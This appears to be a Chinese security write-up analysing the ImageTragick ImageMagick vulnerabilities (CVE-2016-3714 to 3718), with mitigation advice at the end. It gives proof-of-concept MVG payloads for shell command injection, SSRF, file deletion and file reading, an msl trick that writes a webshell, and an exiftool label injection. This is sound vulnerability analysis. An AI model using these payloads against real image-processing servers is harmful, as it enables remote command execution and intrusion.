# CVE-2016-3714 - ImageMagick 命令执行分析

ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。

国外的安全人员为此新建了一个网站： https://imagetragick.com/ ，不得不说，有些外国人蛮会玩的。

相对于之前的数个拥有『主页』的漏洞，这个洞确实不一般，确实是一个可以被利用的好洞，乌云主站上也爆出了数个被该漏洞影响的大厂商。我们先来分析一下它出现的原因。

0x01 原理分析
=========

* * *

与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。

ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的（ https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347 ）

我们在ImageMagick的默认配置文件里可以看到所有的委托： /etc/ImageMagick/delegates.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE delegatemap [
<!ELEMENT delegatemap (delegate)+>
<!ELEMENT delegate (#PCDATA)>
<!ATTLIST delegate decode CDATA #IMPLIED>
<!ATTLIST delegate encode CDATA #IMPLIED>
<!ATTLIST delegate mode CDATA #IMPLIED>
<!ATTLIST delegate spawn CDATA #IMPLIED>
<!ATTLIST delegate stealth CDATA #IMPLIED>
<!ATTLIST delegate thread-support CDATA #IMPLIED>
<!ATTLIST delegate command CDATA #REQUIRED>
]>
<!--
  Delegate command file.

  Commands which specify

    decode="in_format" encode="out_format"

  specify the rules for converting from in_format to out_format These
  rules may be used to translate directly between formats.

  Commands which specify only

    decode="in_format"

  specify the rules for converting from in_format to some format that
  ImageMagick will automatically recognize. These rules are used to
  decode formats.

  Commands which specify only

   encode="out_format"

  specify the rules for an "encoder" which may accept any input format.

  For delegates other than ps:*, pcl:*, and mpeg:* the substitution rules are
  as follows:

    %i  input image filename
    %o  output image filename
    %u  unique temporary filename
    %Z  unique temporary filename
    %#  input image signature
    %b  image file size
    %c  input image comment
    %g  image geometry
    %h  image rows (height)
    %k  input image number colors
    %l  image label
    %m  input image format
    %p  page number
    %q  input image depth
    %s  scene number
    %w  image columns (width)
    %x  input image x resolution
    %y  input image y resolution

  Set option delegate:bimodal=true to process bimodal delegates otherwise they
  are ignored.

  If stealth="True" the delegate is not listed in user requested
  "-list delegate" listings. These are typically special internal delegates.

  If spawn="True" ImageMagick will not way for the delegate to finish,
  nor will it read any output image.  It will only wait for either the input
  file to be removed (See "ephemeral:" coder) indicating that the input file
  has been read, or a maximum time limit of 2 seconds.
-->
<delegatemap>
  <delegate decode="autotrace" stealth="True" command="&quot;convert&quot; &quot;%i&quot; &quot;pnm:%u&quot;\n&quot;autotrace&quot; -input-format pnm -output-format svg -output-file &quot;%o&quot; &quot;%u&quot;"/>
  <delegate decode="blender" command="&quot;blender&quot; -b &quot;%i&quot; -F PNG -o &quot;%o&quot;&quot;\n&quot;convert&quot; -concatenate &quot;%o*.png&quot; &quot;%o&quot;"/>
  <delegate decode="browse" stealth="True" spawn="True" command="&quot;xdg-open&quot; http://www.imagemagick.org/; rm &quot;%i&quot;"/>
  <delegate decode="cdr" command="&quot;uniconvertor&quot; &quot;%i&quot; &quot;%o.svg&quot;; mv &quot;%o.svg&quot; &quot;%o&quot;"/>
  <delegate decode="cgm" thread-support="False" command="&quot;ralcgm&quot; -d ps -oC &lt; &quot;%i&quot; &gt; &quot;%o&quot; 2&gt; &quot;%Z&quot;"/>
  <delegate decode="dvi" command="&quot;dvips&quot; -q -o &quot;%o&quot; &quot;%i&quot;"/>
  <delegate decode="dng:decode" command="&quot;ufraw-batch&quot; --silent --create-id=also --out-type=png --out-depth=16 &quot;--output=%u.png&quot; &quot;%i&quot;"/>
  <delegate decode="dot" command='&quot;dot&quot; -Tsvg &quot;%i&quot; -o &quot;%o&quot;' />
  <delegate decode="edit" stealth="True" command="&quot;/etc/alternatives/x-terminal-emulator&quot; -title &quot;Edit Image Comment&quot; -e vi &quot;%o&quot;"/>
  <delegate decode="eps" encode="pdf" mode="bi" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 &quot;-sDEVICE=pdfwrite&quot; &quot;-sOutputFile=%o&quot; &quot;-f%i&quot;"/>
  <delegate decode="eps" encode="ps" mode="bi" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=nodevice&quot; &quot;-sOutputFile=%o&quot; &quot;-f%i&quot;"/>
  <delegate decode="fig" command="&quot;fig2dev&quot; -L ps &quot;%i&quot; &quot;%o&quot;"/>
  <delegate decode="plt" command="&quot;echo&quot; &quot;set size 1.25,0.62; set terminal postscript portrait color solid; set output \'%o\'; load \'%i\'&quot; &gt; &quot;%u&quot;;&quot;gnuplot&quot; &quot;%u&quot;"/>
  <delegate decode="hpg" command="&quot;hp2xx&quot; -q -m eps -f `basename &quot;%o&quot;` &quot;%i&quot;;     mv -f `basename &quot;%o&quot;` &quot;%o&quot;"/>
  <delegate decode="hpgl" command="if [ -e hp2xx -o -e /usr/bin/hp2xx ]; then     hp2xx -q -m eps -f `basename &quot;%o&quot;` &quot;%i&quot;;     mv -f `basename &quot;%o&quot;` &quot;%o&quot;;   else     echo &quot;You need to install hp2xx to use HPGL files with ImageMagick.&quot;;     exit 1;   fi"/>
  <delegate decode="htm" command="&quot;html2ps&quot; -U -o &quot;%o&quot; &quot;%i&quot;"/>
  <delegate decode="html" command="&quot;html2ps&quot; -U -o &quot;%o&quot; &quot;%i&quot;"/>
  <delegate decode="https" command="&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;"/>
  <delegate decode="ilbm" command="&quot;ilbmtoppm&quot; &quot;%i&quot; &gt; &quot;%o&quot;"/>
  <delegate decode="man" command="&quot;groff&quot; -man -Tps &quot;%i&quot; &gt; &quot;%o&quot;"/>
  <delegate decode="mpeg:decode" command="&quot;ffmpeg&quot; -v -1 -i &quot;%i&quot; -vframes %S -vcodec pam -an -f rawvideo -y &quot;%u.pam&quot; 2&gt; &quot;%Z&quot;"/>
  <delegate encode="mpeg:encode" stealth="True" command="&quot;ffmpeg&quot; -v -1 -mbd rd -trellis 2 -cmp 2 -subcmp 2 -g 300 -i &quot;%M%%d.jpg&quot; &quot;%u.%m&quot; 2&gt; &quot;%Z&quot;"/>
  <delegate decode="sid" command="&quot;mrsidgeodecode&quot; -if sid -i &quot;%i&quot; -of tif -o &quot;%o&quot; &gt; &quot;%u&quot;"/>
  <delegate decode="pcl:color" stealth="True" command="&quot;pcl6&quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=ppmraw&quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &quot;-r%s&quot; %s &quot;-sOutputFile=%s&quot; &quot;%s&quot;"/>
  <delegate decode="pcl:cmyk" stealth="True" command="&quot;pcl6&quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=pamcmyk32&quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &quot;-r%s&quot; %s &quot;-sOutputFile=%s&quot; &quot;%s&quot;"/>
  <delegate decode="pcl:mono" stealth="True" command="&quot;pcl6&quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=pbmraw&quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &quot;-r%s&quot; %s &quot;-sOutputFile=%s&quot; &quot;%s&quot;"/>
  <delegate decode="pdf" encode="eps" mode="bi" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=epswrite&quot; &quot;-sOutputFile=%o&quot; &quot;-f%i&quot;"/>
  <delegate decode="pdf" encode="ps" mode="bi" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=nodevice&quot; &quot;-sOutputFile=%o&quot; &quot;-f%i&quot;"/>
  <delegate decode="tiff" encode="launch" mode="encode" command="&quot;gimp&quot; &quot;%i&quot;"/>
  <delegate decode="pnm" encode="ilbm" mode="encode" command="&quot;ppmtoilbm&quot; -24if &quot;%i&quot; &gt; &quot;%o&quot;"/>
  <delegate decode="pov" command="&quot;povray&quot; &quot;+i%i&quot; -D0 &quot;+o%o&quot; +fn%q +w%w +h%h +a -q9 &quot;-kfi%s&quot; &quot;-kff%n&quot;;&quot;convert&quot; -concatenate &quot;%o*.png&quot; &quot;%o&quot;"/>
  <delegate decode="ps" encode="eps" mode="bi" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=epswrite&quot; &quot;-sOutputFile=%o&quot; &quot;-f%i&quot;"/>
  <delegate decode="ps" encode="pdf" mode="bi" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=pdfwrite&quot; &quot;-sOutputFile=%o&quot; &quot;-f%i&quot;"/>
  <delegate decode="ps" encode="print" mode="encode" command="lpr &quot;%i&quot;"/>
  <delegate decode="ps:alpha" stealth="True" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=pngalpha&quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &quot;-r%s&quot; %s &quot;-sOutputFile=%s&quot; &quot;-f%s&quot; &quot;-f%s&quot;"/>
  <delegate decode="ps:cmyk" stealth="True" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=pam&quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &quot;-r%s&quot; %s &quot;-sOutputFile=%s&quot; &quot;-f%s&quot; &quot;-f%s&quot;"/>
  <delegate decode="ps:color" stealth="True" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=pnmraw&quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &quot;-r%s&quot; %s &quot;-sOutputFile=%s&quot; &quot;-f%s&quot; &quot;-f%s&quot;"/>
  <delegate decode="ps:mono" stealth="True" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=pbmraw&quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &quot;-r%s&quot; %s &quot;-sOutputFile=%s&quot; &quot;-f%s&quot; &quot;-f%s&quot;"/>
  <delegate decode="rgba" encode="rle" mode="encode" command="&quot;rawtorle&quot; -o &quot;%o&quot; -v &quot;%i&quot;"/>
  <delegate decode="scan" command="&quot;scanimage&quot; -d &quot;%i&quot; &gt; &quot;%o&quot;"/>
  <delegate decode="scanx" command="&quot;scanimage&quot; &gt; &quot;%o&quot;"/>
  <delegate decode="miff" encode="show" spawn="True" command="&quot;/usr/bin/display&quot; -delay 0 -window-group %[group] -title &quot;%l &quot; &quot;ephemeral:%i&quot;"/>
  <delegate decode="shtml" command="&quot;html2ps&quot; -U -o &quot;%o&quot; &quot;%i&quot;"/>
  <delegate decode="svg" command="&quot;rsvg-convert&quot; -o &quot;%o&quot; &quot;%i&quot;"/>
  <delegate decode="txt" encode="ps" mode="bi" command="&quot;enscript&quot; -o &quot;%o&quot; &quot;%i&quot;"/>
  <delegate decode="miff" encode="win" stealth="True" spawn="True" command="&quot;/usr/bin/display&quot; -immutable -delay 0 -window-group %[group] -title &quot;%l &quot; &quot;ephemeral:%i&quot;"/>
  <delegate decode="wmf" command="&quot;wmf2eps&quot; -o &quot;%o&quot; &quot;%i&quot;"/>
  <delegate decode="xps:color" stealth="True" command="&quot;gxps&quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=ppmraw&quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &quot;-r%s&quot; %s &quot;-sOutputFile=%s&quot; &quot;%s&quot;"/>
  <delegate decode="xps:cmyk" stealth="True" command="&quot;gxps&quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=bmpsep8&quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &quot;-r%s&quot; %s &quot;-sOutputFile=%s&quot; &quot;%s&quot;"/>
  <delegate decode="xps:mono" stealth="True" command="&quot;gxps&quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;-sDEVICE=pbmraw&quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &quot;-r%s&quot; %s &quot;-sOutputFile=%s&quot; &quot;%s&quot;"/>
</delegatemap>

```

我们可以看到，这里它定义了很多占位符，比如%i是输入的文件名，%l是图片exif label信息。而在后面command的位置，%i和%l等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。

漏洞报告中给出的POC是利用了如下的这个委托：

```
<delegate decode="https" command="&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;"/>

```

它在解析https图片的时候，使用了curl命令将其下载，我们看到%M被直接放在curl的最后一个参数内。ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。

所以我们可以构造一个.mvg格式的图片（但文件名可以不为.mvg，比如下图中包含payload的文件的文件名为vul.gif，而ImageMagick会根据其内容识别为mvg图片），并在https://后面闭合双引号，写入自己要执行的命令：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|id; ")'
pop graphic-context

```

这样，ImageMagick在正常执行图片转换、处理的时候就会触发漏洞：

[![](http://static.wooyun.org//drops/20160505/2016050510205564018.jpg)](http://drops.wooyun.org/wp-content/uploads/2016/05/14624373793837.jpg)

其他几个CVE也比较有趣，比如CVE-2016-3718，他是利用mvg格式中可以包含url的特点，进行SSRF攻击，POC如下：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context

```

CVE-2016-3715是利用ImageMagick支持的ephemeral协议，来删除任意文件：

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
popgraphic-context

```

CVE-2016-3716是利用ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell。

特别说明的是，msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作：

```
file_move.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'msl:/tmp/msl.txt'
popgraphic-context

/tmp/msl.txt
-=-=-=-=-=-=-=-=-
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="/tmp/image.gif" />
<write filename="/var/www/shell.php" />
</image>

```

CVE-2016-3717可以造成本地文件读取漏洞：

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/hosts'
pop graphic-context

```

0x02 深入分析
=========

* * *

除了报告中给出的POC以外，各个安全研究人员也集思广益，发现这个洞的更多利用/影响方式。

首先，PHP扩展『ImageMagick』也存在这个问题，而且只需要调用了Imagick类的构造方法，即可触发这个漏洞：

```
<?php
new Imagick('vul.gif');

```

因为没有返回值，我利用cloudeye捕捉到apache日志，从日志中读取命令执行的结果：

[![](http://static.wooyun.org//drops/20160505/2016050510205522153.png)](http://drops.wooyun.org/wp-content/uploads/2016/05/QQ20160504-5@2x.png)

另外，经过分析，研究人员发现除了.mvg格式的图片以外，普通png格式的图片也能触发命令执行漏洞。我们看到前面委托中对%l，也就是exif label的处理：

```
<delegate decode="miff" encode="show" spawn="True" command="&quot;/usr/bin/display&quot; -delay 0 -window-group %[group] -title &quot;%l &quot; &quot;ephemeral:%i&quot;"/>

```

它将%l拼接进入了/usr/bin/display命令中，所以我只需将正常的png图片，带上一个『恶意』的exif信息。在调用ImageMagick将其处理成.show文件的时候，即可触发命令注入漏洞：

```
exiftool -label="\"|/usr/bin/id; \"" test.png
convert test.png o.show

```

[![](http://static.wooyun.org//drops/20160505/2016050510205512761.jpg)](http://drops.wooyun.org/wp-content/uploads/2016/05/14624399792594.jpg)

但这个方法鸡肋之处在于，因为delegate.xml中配置的encode="show"（或"win"），所以只有输出为.show或.win格式的情况下才会调用这个委托，而普通的文件处理是不会触发这个命令的。

0x03 影响分析
=========

* * *

ImageMagick是一个使用非常广的组件，大量厂商都在处理图片的时候调用这个程序进行处理，而且很多开源应用也在核心代码中包含了ImageMagick选项。

Wordpress是著名的个人博客/CMS厂商，其核心源码中使用了PHP扩展ImageMagick。受到这个漏洞的影响，在攻击者拥有一定权限的情况下，可以在Wordpress中触发任意命令执行漏洞：[WooYun: Wordpress某核心功能命令执行漏洞（一定权限）](http://www.wooyun.org/bugs/wooyun-2016-0205047)

同样的，Discuz、Drupal等常用CMS中也调用了ImageMagick扩展或ImageMagick库，CVE-2016-3714也可能会影响到他们。

但根据我对Discuz的分析，其调用ImageMagick处理图片之前，会先使用php的getimagesize进行图片格式、大小的验证，所以本文中所涉及的POC无法在Disucz中直接使用，但不排除有其他方法绕过discuz对该问题的限制。

除了开源软件中的漏洞以外，国内外各大厂商或多或少都收到了该问题的影响，影响最大的应该属人人，人人某处上传位置调用了ImageMagick进行图片的处理，结果造成了命令执行，导致内网被白帽子攻破：[WooYun: 人人网某漏洞导致直接Getshell影响主干网络直入内网](http://www.wooyun.org/bugs/wooyun-2016-0205171)

另外，百度、优酷、腾讯、七牛等诸多厂商都收到该漏洞影响：[WooYun: QQ邮箱命某处令执行](http://www.wooyun.org/bugs/wooyun-2016-0205381)、[WooYun: 腾讯微云远程命令执行](http://www.wooyun.org/bugs/wooyun-2016-0205375)、[WooYun: 七牛云存储远程命令执行漏洞影响图片处理服务器](http://www.wooyun.org/bugs/wooyun-2016-0205290)、[WooYun: 百度某站远程命令执行漏洞](http://www.wooyun.org/bugs/wooyun-2016-0205259)、[WooYun: 一张图片引发的血案百度某处命令执行](http://www.wooyun.org/bugs/wooyun-2016-0205206)、[WooYun: 优酷主站存在远程命令执行漏洞](http://www.wooyun.org/bugs/wooyun-2016-0205389)

还有个比较有意思的地方，因为新浪sae的php包含ImageMagick扩展，所以乌云上有白帽子利用这个漏洞，成功绕过了sae的沙盒[WooYun: SAE 沙盒绕过（ImageMagick CVE20163714 应用实例）](http://www.wooyun.org/bugs/wooyun-2016-0205051)

0x04 漏洞修复
=========

* * *

关于这个漏洞影响ImageMagick 6.9.3-9以前是所有版本，包括ubuntu源中安装的ImageMagick。而官方在6.9.3-9版本中对漏洞进行了不完全的修复。所以，我们不能仅通过更新ImageMagick的版本来杜绝这个漏洞。

现在，我们可以通过如下两个方法来暂时规避漏洞：

1.  处理图片前，先检查图片的 "magic bytes"，也就是图片头，如果图片头不是你想要的格式，那么就不调用ImageMagick处理图片。如果你是php用户，可以使用getimagesize函数来检查图片格式，而如果你是wordpress等web应用的使用者，可以暂时卸载ImageMagick，使用php自带的gd库来处理图片。
2.  使用policy file来防御这个漏洞，这个文件默认位置在 /etc/ImageMagick/policy.xml ，我们通过配置如下的xml来禁止解析https等敏感操作：

——

```
<policymap>
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
</policymap>

```

参考文献：  
https://imagetragick.com/  
http://www.openwall.com/lists/oss-security/2016/05/03/18  
http://weibo.com/p/1001603971443670055277

并感谢 @redrain有节操 @Ricter @BigBan 的帮助